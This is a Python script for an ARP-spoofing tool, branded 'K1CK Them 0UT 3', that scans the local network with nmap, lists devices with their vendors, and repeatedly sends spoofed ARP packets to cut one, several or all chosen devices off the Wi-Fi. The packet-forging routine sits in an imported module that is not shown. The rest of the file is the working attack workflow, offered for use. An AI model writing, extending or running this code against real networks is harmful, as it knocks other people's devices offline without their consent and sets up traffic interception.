#!/usr/bin/env python3

import time, os, sys, logging, math, subprocess
from time import sleep
import requests
import traceback
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

notRoot = False
try:
    # check whether user is root
    if os.geteuid() != 0:
        print("\n{0}ERROR: K1CKThemOut must be run with root privileges. Try again with sudo:\n\t{1}$ sudo python3 L0CK.py{2}\n".format(RED, GREEN, END))
        notRoot = True
except:
    # then user is probably on windows
    pass
if notRoot:
    raise SystemExit

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
try:
    from scapy.all import *
    import R_spoof
    import nmap

except:
    print("\n{0}ERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.".format(RED))
    print("\n{0}If you still cannot resolve this error, please submit an issue here:\n\t{1}https://github.com/R3DDY97/K1CK_them_0UT3/issues\n{2}".format(RED, BLUE, END))
    raise SystemExit

##########################################################################################

# display heading
def heading():
    spaces = " " * 70
    sys.stdout.write(RED + spaces + """


    KK  KK IIIII  CCCCC  KK  KK  tt    hh
    KK KK   III  CC    C KK KK   tt    hh        eee  mm mm mmmm
    KKKK    III  CC      KKKK    tttt  hhhhhh  ee   e mmm  mm  mm
    KK KK   III  CC    C KK KK   tt    hh   hh eeeee  mmm  mm  mm
    KK  KK IIIII  CCCCC  KK  KK   tttt hh   hh  eeeee mmm  mm  mm

     OOOOO  UU   UU TTTTTTT        333333
    OO   OO UU   UU   TTT             3333
    OO   OO UU   UU   TTT   _____    3333
    OO   OO UU   UU   TTT              333
     OOOO0   UUUUU    TTT          333333


    """ + END + BLUE +
    '\n' + '{0}K1CK devices accesing your Wifi  ({1}K1CK TH3M 0UT 3{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(98) +
    '\n' + 'Made With <3 by: {0}SH3RL0CK ({1}B4TM4N{2}) & {0}W4TS0N ({1}AGNUS{2}){3}'.format(
        YELLOW, RED, YELLOW, BLUE).center(111) +
    '\n' + 'Version: {0}0.1{1}\n'.format(YELLOW, END).center(86))

############################################################################################

# display options
def optionBanner():
    print('\n\tChoose option from menu:\n')
    sleep(0.2)
    print('\t\t{0}[{1}1{2}]{3} K1CK ONE Off'.format(YELLOW, RED, YELLOW, WHITE))
    sleep(0.2)
    print('\t\t{0}[{1}2{2}]{3} K1CK SOME Off'.format(YELLOW, RED, YELLOW, WHITE))
    sleep(0.2)
    print('\t\t{0}[{1}3{2}]{3} K1CK ALL Off'.format(YELLOW, RED, YELLOW, WHITE))
    sleep(0.2)
    print('\n\t\t{0}[{1}E{2}]{3} Exit K1CK-Them-0UT\n'.format(YELLOW, RED, YELLOW, WHITE))

##########################################################################################

#  Scan network to get all details required to KEEP them OUT
def scanNetwork():
    global onlineIPs
    global IPlist
    global hostsList
    global GatewayInterface
    global defaultGatewayMac
    global defaultGatewayIP
    global defaultInterface
    global defaultInterfaceMAC
    global defaultInterfaceIP

    try:
        routing = scapy.config.conf.route.routes
        gateway = scapy.utils.ltoa(routing[3][0])
        netmask = 32 - int(round(math.log(0xFFFFFFFF - (routing[3][1]), 2)))
        defaultGatewayIP = routing[1][2]
        defaultInterface = routing[3][3]
        defaultInterfaceMAC = get_if_hwaddr(defaultInterface)
        defaultInterfaceIP = routing[3][4]
        GatewayInterface = "{0}/{1}".format(gateway,netmask)
    except:
        print("\n{0}ERROR: Network scanning failed. Please check your requirements configuration.{1}\n".format(RED, END))
        raise SystemExit

    try:
        # Scanning Network using nmap
        nm = nmap.PortScanner()
        scanDict = nm.scan(hosts=GatewayInterface, arguments='-n -sP -PE')
        onlineIPs = nm.all_hosts()
        IPlist = onlineIPs
        IPlist.remove(defaultInterfaceIP)
        hostsList = [[x,nm[x]['addresses']['mac']] for x in IPlist]
        macList = [[nm[x]['addresses']['mac']] for x in IPlist]
        defaultGatewayMac = nm[defaultGatewayIP]['addresses']['mac']

    except KeyboardInterrupt:
        print('\n\n\t{0}ThanK Y0U for DR0PP1NG by \n \tSEE U S00N!{1}\n\n'.format(YELLOW, END))
        raise SystemExit
    except:
        print("\n{0}ERROR: Network scanning failed. Please check your requirements configuration.{1}\n".format(RED, END))
        raise SystemExit

# resolve mac address of each vendor
def resolveMac(mac):
    try:
        # send request to macvendors.co
        url = "http://macvendors.co/api/vendorname/"
        Site = requests.get(url + mac)
        vendor = Site.content.decode("utf-8")
        return vendor
    except:
        return "N/A"


# ########################################################################################


# K1CK one device
def K1CKoneoff():
    os.system("clear||cls")
    print("\n{0}K1CK-ONE-0ff{1} iz selected...{2}\n".format(RED, GREEN, END))
    sys.stdout.write("\n\t{0}Scanning your N3TW0RK, H4NG 0N...{1}\r".format(RED, END))
    scanNetwork()

    print("\n\n\t\t{0}Online IPs: ".format(MAGENTA))
    print("\t\t-----------\n")
    print("{0}   No \t {1}IP ADDRESS \t {2}MAC ADDRESS   \t\t {3}VENDOR NAME {4}\n".format(YELLOW, WHITE, RED, GREEN, END))
    for i,j in enumerate(hostsList):
        ip = hostsList[i][0]
        mac = hostsList[i][1]
        vendor = resolveMac(mac)
        print("  {0}[{5}]\t{1}{6}\t{2}{7}\t{3}{8}{4}".format(YELLOW, WHITE, RED, GREEN, END,i,ip,mac,vendor))


    canBreak = False
    while not canBreak:
        try:
            choice = int(input("\n\t{0}CH00SE a target:-{1} ".format(WHITE,END)))
            one_target_ip = hostsList[choice][0]
            one_target_mac = hostsList[choice][1]
            vendor = resolveMac(one_target_mac)
            canBreak = True
        except KeyboardInterrupt:
            return
        except:
            print("\n{0}ERROR: Please enter a number from the list!{1}".format(RED, END))

            return


    print("\n\t{0}Target:-  {5}{1} - {6}{3}  -  {7}{4} {2}".format(RED,one_target_ip, END,one_target_mac,vendor,WHITE,RED,GREEN))

    print("\n\t {0}SP00FING has started... {1}\n".format(BLUE, END))

    try:
        while True:
            # broadcast malicious ARP packets (10p/s)
            R_spoof.sendPacket(defaultInterfaceMAC, defaultGatewayIP, one_target_ip, one_target_mac)
            time.sleep(10)
            print("Now {0}  -  {1}  cant access Wifi".format(one_target_ip, resolveMac(one_target_mac)))
    except KeyboardInterrupt:
        return

#########################################################################################

# K1CK multiple devices
def K1CKsomeoff():
    os.system("clear||cls")
    print("\n{0}K1CK-S0ME-0ff{1} iz selected...{2}\n".format(RED, GREEN, END))
    sys.stdout.write("\n\t{0}Scanning your N3TW0RK, H4NG 0N...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    scanNetwork()
    if len(hostsList) == 2:
        print("\n\n\tThere are not more than ONE device to K1CK.. Select K1CKoneoff\n\n\t")
        return

    print("\n\t\t{0}Online IPs: ".format(MAGENTA))
    print("\t\t-----------\n")
    print("{0}   No \t {1}IP ADDRESS \t {2}MAC ADDRESS   \t\t {3}VENDOR NAME {4}\n".format(YELLOW, WHITE, RED, GREEN, END))
    for i,j in enumerate(hostsList):
        ip = hostsList[i][0]
        mac = hostsList[i][1]
        vendor = resolveMac(mac)
        print("  {0}[{5}]\t{1}{6}\t{2}{7}\t{3}{8}{4}".format(YELLOW, WHITE, RED, GREEN, END,i,ip,mac,vendor))


    canBreak = False
    while not canBreak:
        try:
            choice = input("\nChoose devices to target(comma-separated): ")
            if ',' in choice:
                some_targets = choice.split(",")
                canBreak = True
            else:
                print("\n{0}ERROR: Please select more than 1 devices from the list.{1}\n".format(RED, END))

        except KeyboardInterrupt:
            return


    some_ipList = []
    some_ipMac = []


    try:
        for i in some_targets:
            some_ipList.append(hostsList[int(i)][0])
            some_ipMac.append(hostsList[int(i)][1])


    except KeyboardInterrupt:
        return
    except:
        print("\n{0}ERROR: {1}{4}{2} is not in the list.{3}\n".format(RED, GREEN, RED, END,i))
        return


    print("\n\t{0}Targets:-  {1}\n\t\tIPs --->  {2}\n\t\tMACs -->  {3}".format(GREEN, END,some_ipList,some_ipMac))

    print("\n\t {0}SP00FING has started... {1}".format(BLUE, END))
    try:
        while True:
            # broadcast malicious ARP packets (10p/s)
            for i in some_targets:
                R_spoof.sendPacket(defaultInterfaceMAC, defaultGatewayIP, hostsList[int(i)][0], hostsList[int(i)][1])
            time.sleep(10)
    except KeyboardInterrupt:
        return


# ########################################################################################

# K1CK all devices
def K1CKalloff():
    os.system("clear||cls")

    print("\n{0}K1CK-ALL-Off{1} iz selected...{2}\n".format(RED, GREEN, END))
    sys.stdout.write("\n\t{0}Scanning your N3TW0RK, H4NG 0N...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    scanNetwork()

    print("\t\tOnline IPs: ")
    for i in range(len(IPlist)):
        mac = ""
        for host in hostsList:
            if host[0] == IPlist[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print(str("  {0}"+ str(onlineIPs[i]) + "{1}\t -" + vendor + "{2}").format(RED, GREEN, END))

    print("\n\n\t{0}SP00FING has started... {1}".format(BLUE, END))
    try:
        # broadcast malicious ARP packets (10p/s)
        reScan = 0
        while True:
            for host in hostsList:
                if host[0] != defaultGatewayIP:
                    # dodge gateway (avoid crashing network itself)
                    R_spoof.sendPacket(defaultInterfaceMAC, defaultGatewayIP, host[0], host[1])
            reScan += 1
            if reScan == 4:
                reScan = 0
                scanNetwork()
            time.sleep(10)
    except KeyboardInterrupt:
        return


# ########################################################################################

# script's main function
def main():
    heading()
    print("\n{0}Using interface {1}{10}{2} with mac address {3}{11}{4}.\nGateway IP: {5}{12}{6} --> {7}{13}{8} hosts are up.{9}".format(GREEN, RED, GREEN, RED, GREEN, RED, GREEN, RED, GREEN, END,defaultInterface,defaultGatewayMac,defaultGatewayIP,len(hostsList)))
    # display warning in case of no active hosts
    if len(hostsList) == 1:
        if hostsList[0][0] == defaultGatewayIP:
            print("\n{0}{1}WARNING: There are {2}0{3} hosts up on you network except your gateway.\n\tYou can't K1CK anyone off {4}:/{5}\n".format(GREEN, RED, GREEN, RED, GREEN, END))
            raise SystemExit


    try:
        while True:
            os.system("clear||cls")
            heading()
            optionBanner()
            header = ('{0}K1CKthemout{1}> {2}'.format(BLUE, WHITE, END))
            choice = input(header)

            if choice.upper() == 'E' or choice.upper() == 'EXIT':
                print('\n\n\t\t{0}ThanK Y0U for DR0PP1NG by \n\n\t\tSEE U S00N!{1}\n\n\n'.format(YELLOW, END))
                raise SystemExit
            elif choice == '1':
                K1CKoneoff()
            elif choice == '2':
                K1CKsomeoff()
            elif choice == '3':
                K1CKalloff()
            elif choice.upper() == 'CLEAR':
                os.system("clear||cls")
            else:
                print("\n{0}ERROR: Please select a valid option.{1}\n".format(RED, END))

    except KeyboardInterrupt:
        print('\n\n\t{0}ThanK Y0U for DR0PP1NG by \n \tSEE U S00N!{1}\n\n'.format(YELLOW, END))

if __name__ == '__main__':
    os.system("clear||cls")
    sys.stdout.write("\n\t{0}Scanning your N3TW0RK, H4NG 0N...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    # configure appropriate network info
    scanNetwork()
    main()
